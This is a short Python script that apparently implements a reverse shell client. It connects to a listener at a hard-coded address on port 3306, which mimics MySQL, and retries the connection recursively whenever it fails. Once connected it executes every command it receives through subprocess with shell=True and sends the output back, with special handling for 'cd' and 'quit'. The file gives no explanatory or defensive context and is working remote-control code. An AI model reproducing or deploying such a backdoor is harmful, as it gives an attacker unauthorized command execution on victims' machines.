import socket
import subprocess
import os
import sys


def join_connection():
    try:
        global soc
        global host
        global port

        soc = socket.socket()
        host = '127.0.0.1'
        #host = '192.168.56.1'
        port = 3306

        print('[i] attempting to connect to {}:{}'.format(host, port))
        soc.connect((host, port))
        print('[i] connection to {}:{} is successful'.format(host, port))
    except Exception:
        print('[i] failed to connect')
        join_connection()


def receive_command():
    while True:
        try:
            command = soc.recv(1024)
            if str(command, 'utf-8').split()[0] == 'cd' and len(str(command, 'utf-8').split()) > 1:
                os.chdir(str(command, 'utf-8').split(' ')[1])
                cwd = os.getcwd()
                send_response(str.encode(cwd))
            elif str(command, 'utf-8').split()[0] == 'cd' and len(str(command, 'utf-8').split()) == 1:
                cwd = os.getcwd()
                send_response(str.encode(cwd))
            elif str(command, 'utf-8').split()[0] == 'quit':
                print('[i] terminating connection... done')
                sys.exit()
            else:
                response = subprocess.check_output(str(command, 'utf-8'), shell=True)
                send_response(response)
                print(str(command, 'utf-8') + '\n' + str(response, 'utf-8'))
        except subprocess.CalledProcessError:
            # print('[!] Error ',subprocess.CalledProcessError)
            send_response(str.encode('Invalid command'))


def send_response(response):
    soc.send(response)


def main():
    join_connection()
    receive_command()


main()
